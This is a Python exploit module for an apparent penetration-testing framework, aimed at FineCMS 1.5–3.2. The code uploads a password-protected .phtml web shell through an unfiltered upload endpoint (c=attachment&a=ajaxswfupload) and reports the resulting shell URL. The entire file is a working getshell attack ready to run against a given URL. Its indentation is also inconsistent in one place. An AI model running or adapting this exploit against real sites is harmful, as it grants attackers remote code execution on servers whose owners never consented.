#coding: utf-8

import os
import sys
import datetime
import re
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class finecms_fileupload_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'finecms_fileupload_getshell',
            'author': 'x',
            'date': '2018-02-26',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'FineCMS',
            'min_version': '1.5',
            'max_version': '3.2',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Finecms ajaxswfupload getshell,finecms某处过滤不严格,导致可上传任意脚本文件.',
            'reference':'FineCMS前台getshell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
    	key={
            'type':'phtml',
            'size':'100',
            'submit':'上传文件'
            }
        randpass = get_random_password()
        shell = {'Filedata':('%s.phtml'%get_random_password(), open("shell/finecms_fileupload_getshell.phtml",'rb').read().replace('__RANDPASS__', randpass))}
        url = self.url+"/index.php?c=attachment&a=ajaxswfupload"
        req = session()
        try:
            r=req.post(url=url, data=key, files=shell)
        except Exception as e:
            self.report('目标连接失败', Level.error)
            return
        m=re.findall(r'uploadfiles.*?phtml', r.text)
        if m:
            #print self.url+'/'+str(m[0]), randpass
            self.shell_info(self.url+'/'+str(m[0]), randpass, 'php')
        else:
            print r.text


if __name__ == "__main__":
    # url = 'http://localhost:86/FineCMS/'
    # a = finecms_fileupload_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = finecms_fileupload_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

